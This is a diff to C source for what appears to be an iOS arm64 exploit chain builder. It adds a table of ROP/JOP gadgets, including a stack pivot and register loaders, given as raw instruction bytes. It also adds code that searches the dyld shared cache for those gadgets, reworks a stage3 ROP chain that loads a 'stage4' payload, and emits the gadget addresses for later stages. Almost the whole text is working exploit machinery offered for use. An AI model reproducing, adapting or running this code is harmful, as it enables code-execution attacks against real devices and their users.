@@ -485,11 +485,11 @@ static struct gadget_t {
 #endif
 #if 1 // these are used inside stage3 to map stage4
     /*
-    adrx0_d0:
-    910343e0 add x0, sp, #0xd0
+    adrx0_100:
+    910403e0 add x0, sp, #0x100
     d63f0100 blr x8
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0x910343e0, 0xd63f0100 }, 2 * 4, NULL, 0 },
+    { 0, (uint8_t *)&(uint32_t []){ 0x910403e0, 0xd63f0100 }, 2 * 4, NULL, 0 },
 #endif
     /*
     jop2:
@@ -559,6 +559,230 @@ search_gadgets(const uint8_t *p, size_t sz)
             } else {
                 gadgets[i].addr = found - p;
                 printf("bm found gadget[%zu] 0x%llx, size=%zu\n", i, gadgets[i].addr, gadgets[i].length);
+            }
+        }
+    }
+    return j;
+}
+
+static struct gadget_t gadgets_more[] = {
+    /*
+    gadgets_0:
+    f940008c ldr x12, [x4]
+    f9401985 ldr x5, [x12, #0x30]
+    aa0403e0 mov x0, x4
+    aa0b03e1 mov x1, x11
+    aa0a03e2 mov x2, x10
+    aa0903e3 mov x3, x9
+    aa0803e4 mov x4, x8
+    d61f00a0 br x5
+    alt-gadgets_0:
+    f9400089 ldr x9, [x4]
+    f9401925 ldr x5, [x9, #0x30]
+    aa0403e0 mov x0, x4
+    aa0803e4 mov x4, x8
+    d61f00a0 br x5
+    */
+    { 0, (uint8_t *)&(uint32_t []){ 0xf940008c, 0xf9401985, 0xaa0403e0, 0xaa0b03e1, 0xaa0a03e2, 0xaa0903e3, 0xaa0803e4, 0xd61f00a0 }, 8 * 4,
+         (uint8_t *)&(uint32_t []){ 0xf9400089, 0xf9401925, 0xaa0403e0, 0xaa0803e4, 0xd61f00a0 }, 5 * 4 },
+    /*
+    gadgets_1:
+    f9400408 ldr x8, [x0, #8]
+    f9400900 ldr x0, [x8, #0x10]
+    f9400008 ldr x8, [x0]
+    f9400d01 ldr x1, [x8, #0x18]
+    d61f0020 br x1
+    */
+    { 0, (uint8_t *)&(uint32_t []){ 0xf9400408, 0xf9400900, 0xf9400008, 0xf9400d01, 0xd61f0020 }, 5 * 4, NULL, 0 },
+    /*
+    gadgets_2:
+    f9400408 ldr x8, [x0, #8]
+    f9400d00 ldr x0, [x8, #0x18]
+    b4000080 cbz x0, ...
+    f9400008 ldr x8, [x0]
+    f9403101 ldr x1, [x8, #0x60]
+    d61f0020 br x1
+    */
+    { 0, (uint8_t *)&(uint32_t []){ 0xf9400408, 0xf9400d00, 0xb4000080, 0xf9400008, 0xf9403101, 0xd61f0020 }, 6 * 4, NULL, 0 },
+    /*
+    gadgets_3:
+    a9bf7bfd stp x29, x30, [sp, #-0x10]!
+    910003fd mov x29, sp
+    f9400808 ldr x8, [x0, #0x10]
+    d63f0100 blr x8
+    d2800000 movz x0, #0
+    a8c17bfd ldp x29, x30, [sp], #0x10
+    d65f03c0 ret
+    */
+    { 0, (uint8_t *)&(uint32_t []){ 0xa9bf7bfd, 0x910003fd, 0xf9400808, 0xd63f0100, 0xd2800000, 0xa8c17bfd, 0xd65f03c0 }, 7 * 4, NULL, 0 },
+    /*
+    gadgets_4:
+    a9420001 ldp x1, x0, [x0, #0x20]
+    d61f0020 br x1
+    */
+    { 0, (uint8_t *)&(uint32_t []){ 0xa9420001, 0xd61f0020 }, 2 * 4, NULL, 0 },
+    /*
+    gadgets_5:
+    a9be4ff4 stp x20, x19, [sp, #-0x20]!
+    a9017bfd stp x29, x30, [sp, #0x10]
+    910043fd add x29, sp, #0x10
+    aa0003f3 mov x19, x0
+    a9402260 ldp x0, x8, [x19]
+    b9401261 ldr w1, [x19, #0x10]
+    a9418e62 ldp x2, x3, [x19, #0x18]
+    f9401a64 ldr x4, [x19, #0x30]
+    d63f0100 blr x8
+    f9001660 str x0, [x19, #0x28]
+    a9417bfd ldp x29, x30, [sp, #0x10]
+    a8c24ff4 ldp x20, x19, [sp], #0x20
+    d65f03c0 ret
+    alt-gadgets_5:
+    a9be4ff4 stp x20, x19, [sp, #-0x20]!
+    a9017bfd stp x29, x30, [sp, #0x10]
+    910043fd add x29, sp, #0x10
+    aa0003f3 mov x19, x0
+    f9400000 ldr x0, [x0]
+    f9400668 ldr x8, [x19, #8]
+    b9401261 ldr w1, [x19, #0x10]
+    a9418e62 ldp x2, x3, [x19, #0x18]
+    f9401a64 ldr x4, [x19, #0x30]
+    d63f0100 blr x8
+    f9001660 str x0, [x19, #0x28]
+    a9417bfd ldp x29, x30, [sp, #0x10]
+    a8c24ff4 ldp x20, x19, [sp], #0x20
+    d65f03c0 ret
+    */
+    { 0, (uint8_t *)&(uint32_t []){ 0xa9be4ff4, 0xa9017bfd, 0x910043fd, 0xaa0003f3, 0xa9402260, 0xb9401261, 0xa9418e62, 0xf9401a64, 0xd63f0100, 0xf9001660, 0xa9417bfd, 0xa8c24ff4, 0xd65f03c0 }, 13 * 4,
+         (uint8_t *)&(uint32_t []){ 0xa9be4ff4, 0xa9017bfd, 0x910043fd, 0xaa0003f3, 0xf9400000, 0xf9400668, 0xb9401261, 0xa9418e62, 0xf9401a64, 0xd63f0100, 0xf9001660, 0xa9417bfd, 0xa8c24ff4, 0xd65f03c0 }, 14 * 4 },
+    /*
+    gadgets_6:
+    f9400000 ldr x0, [x0]
+    d65f03c0 ret
+    */
+    { 0, (uint8_t *)&(uint32_t []){ 0xf9400000, 0xd65f03c0 }, 2 * 4, NULL, 0 },
+    /*
+    gadgets_7:
+    f9000002 str x2, [x0]
+    d65f03c0 ret
+    */
+    { 0, (uint8_t *)&(uint32_t []){ 0xf9000002, 0xd65f03c0 }, 2 * 4, NULL, 0 },
+    /*
+    gadgets_8:
+    a9402005 ldp x5, x8, [x0]
+    a9410c01 ldp x1, x3, [x0, #0x10]
+    a9421002 ldp x2, x4, [x0, #0x20]
+    aa0803e0 mov x0, x8
+    d61f00a0 br x5
+    */
+    { 0, (uint8_t *)&(uint32_t []){ 0xa9402005, 0xa9410c01, 0xa9421002, 0xaa0803e0, 0xd61f00a0 }, 5 * 4, NULL, 0 },
+    /*
+    pivot:
+    9100003f mov sp, x1
+    d61f0000 br x0
+    */
+    { 0, (uint8_t *)&(uint32_t []){ 0x9100003f, 0xd61f0000 }, 2 * 4, NULL, 0 },
+// even more
+    /*
+    a9420408 ldp x8, x1, [x0, #0x20]
+    a9430c02 ldp x2, x3, [x0, #0x30]
+    a9441404 ldp x4, x5, [x0, #0x40]
+    f9402806 ldr x6, [x0, #0x50]
+    f9400907 ldr x7, [x8, #0x10]
+    aa0803e0 mov x0, x8
+    d61f00e0 br x7
+    */
+    { 0, (uint8_t *)&(uint32_t []){ 0xa9420408, 0xa9430c02, 0xa9441404, 0xf9402806, 0xf9400907, 0xaa0803e0, 0xd61f00e0 }, 7 * 4, NULL, 0 },
+    /*
+    a940a408 ldp x8, x9, [x0, #8]
+    aa0803e0 mov x0, x8
+    d61f0120 br x9
+    */
+    { 0, (uint8_t *)&(uint32_t []){ 0xa940a408, 0xaa0803e0, 0xd61f0120 }, 3 * 4, NULL, 0 },
+    /*
+    d10083ff sub sp, sp, #0x20
+    a9017bfd stp x29, x30, [sp, #0x10]
+    910043fd add x29, sp, #0x10
+    a9000fe2 stp x2, x3, [sp]
+    f9400c00 ldr x0, [x0, #0x18]
+    b4000100 cbz x0, #0x1957d65ec
+    f9400008 ldr x8, [x0]
+    f9401908 ldr x8, [x8, #0x30]
+    910003e2 mov x2, sp
+    d63f0100 blr x8
+    a9417bfd ldp x29, x30, [sp, #0x10]
+    910083ff add sp, sp, #0x20
+    d65f03c0 ret
+    */
+    { 0, (uint8_t *)&(uint32_t []){ 0xd10083ff, 0xa9017bfd, 0x910043fd, 0xa9000fe2, 0xf9400c00, 0xb4000100, 0xf9400008, 0xf9401908, 0x910003e2, 0xd63f0100, 0xa9417bfd, 0x910083ff, 0xd65f03c0 }, 13 * 4, NULL, 0 },
+    /*
+    f9406508 ldr x8, [x8, #0xc8] // iOS12 has 0xd0: f9406908
+    d2800007 movz x7, #0
+    d61f0100 br x8
+    */
+    { 0, (uint8_t *)&(uint32_t []){ 0xf9406508, 0xd2800007, 0xd61f0100 }, 3 * 4,
+         (uint8_t *)&(uint32_t []){ 0xf9406908, 0xd2800007, 0xd61f0100 }, 3 * 4 },
+};
+
+static AC_STRUCT *
+ac_init_more(void)
+{
+    int rv;
+    size_t i, na = countof(gadgets_more);
+    AC_STRUCT *node = ac_alloc();
+    if (!node) {
+        return NULL;
+    }
+    for (i = 0; i < na; i++) {
+        rv = ac_add_string(node, (char *)gadgets_more[i].bytes, gadgets_more[i].length, i + 1);
+        if (!rv) {
+            ac_free(node);
+            return NULL;
+        }
+    }
+    rv = ac_prep(node);
+    if (!rv) {
+        fprintf(stderr, "!ac_prep\n");
+        ac_free(node);
+        return NULL;
+    }
+    return node;
+}
+
+static int
+search_gadgets_more(const uint8_t *p, size_t sz)
+{
+    const uint8_t *q = p;
+    size_t i, j = 0, n = countof(gadgets_more);
+    if (n > 0) {
+        AC_STRUCT *ac = ac_init_more();
+        if (ac) {
+            ac_search_init(ac, (char *)p, sz);
+            while (n > 0) {
+                int id = 0;
+                int length = 0;
+                char *found = ac_search(ac, &length, &id);
+                if (!found) {
+                    break;
+                }
+                if (!gadgets_more[id - 1].addr) {
+                    printf("ac found gadget[%d] 0x%zx, size=%d\n", id - 1, found - (char *)p, length);
+                    gadgets_more[id - 1].addr = found - (char *)p;
+                    n--;
+                }
+                q = (uint8_t *)found;
+            }
+            ac_free(ac);
+        }
+    }
+    for (i = 0; i < countof(gadgets_more); i++) {
+        if (!gadgets_more[i].addr) {
+            uint8_t *found = boyermoore_horspool_memmem(p, sz, gadgets_more[i].bytes2, gadgets_more[i].length2);
+            if (!found) {
+                fprintf(stderr, "gadget %zu missing\n", i);
+                j++;
+            } else {
+                gadgets_more[i].addr = found - p;
+                printf("bm found gadget[%zu] 0x%llx, size=%zu\n", i, gadgets_more[i].addr, gadgets_more[i].length2);
             }
         }
     }
@@ -830,8 +1054,8 @@ if (0) {
         r(0); \
         r(gadget_loadx6); \
         r(symbol_open); \
-        r(gadget_adrx0_d0); \
-            strcpy((char *)rstrip + 0xd0, stage4); \
+        r(gadget_adrx0_100); \
+            strcpy((char *)rstrip + 0x100, stage4); \
         r(0); \
         r(gadget_loadx1); \
         r(0); \
@@ -853,6 +1077,9 @@ if (0) {
         r(gadget_zerox5); \
         r(0); \
         r(gadget_call6); \
+        retx8(); \
+        r(0); \
+        r(gadget_adrx0_100); \
         r(addr2); \
         r(gadget_set_sp); \
     } while (0)
@@ -879,7 +1106,7 @@ build_stage3(uint64_t address, uint64_t symbol_open, uint64_t symbol_mmap, size_
     uint64_t gadget_mov_x4_x0 = address + gadgets[14].addr;
     uint64_t gadget_call6 = address + gadgets[15].addr;
     uint64_t gadget_set_sp = address + gadgets[17].addr;
-    uint64_t gadget_adrx0_d0 = address + gadgets[22].addr;
+    uint64_t gadget_adrx0_100 = address + gadgets[22].addr;
 
     rstrip = calloc(1, rsz);
     assert(rstrip);
@@ -999,6 +1226,8 @@ really(const uint8_t *p, off_t sz, uint64_t masterSlide)
 
     rv = search_gadgets(p, map[0].size);
     assert(rv == 0);
+    rv = search_gadgets_more(p, map[0].size);
+    assert(rv == 0);
 
     /*
     preflightCacheFile:
@@ -1060,6 +1289,16 @@ really(const uint8_t *p, off_t sz, uint64_t masterSlide)
     fprintf(f, "extern gadget_lea_x0_jmp_x8 = 0x%llx;\n", map[0].address + gadgets[21].addr);
     fprintf(f, "extern _platform_memmove_plus4 = 0x%llx;\n", memmove_func + 4);
     fprintf(f, "extern memmove_lazy = 0x%llx; // libsystem_c.dylib memmove lazy pointer\n", memmove_lazy);
+    fprintf(f, "// stage4+\n");
+    fprintf(f, "extern dyld_shared_cache_arm64 = 0x%llx;\n", map[0].address);
+    for (i = 0; i < countof(gadgets_more); i++) {
+        fprintf(f, "extern gadgets_%X = 0x%llx;\n", i, map[0].address + gadgets_more[i].addr);
+    }
+    fprintf(f, "#define gadgets_pivot   gadgets_9\n");
+    fprintf(f, "#define gadgets_load_6  gadgets_A\n");
+    fprintf(f, "#define gadgets_set_x8  gadgets_B\n");
+    fprintf(f, "#define gadgets_call2v  gadgets_C\n");
+    fprintf(f, "#define gadgets_set_x7  gadgets_D\n");
     fclose(f);
     f = fopen("config2.asm", "wt");
     assert(f);
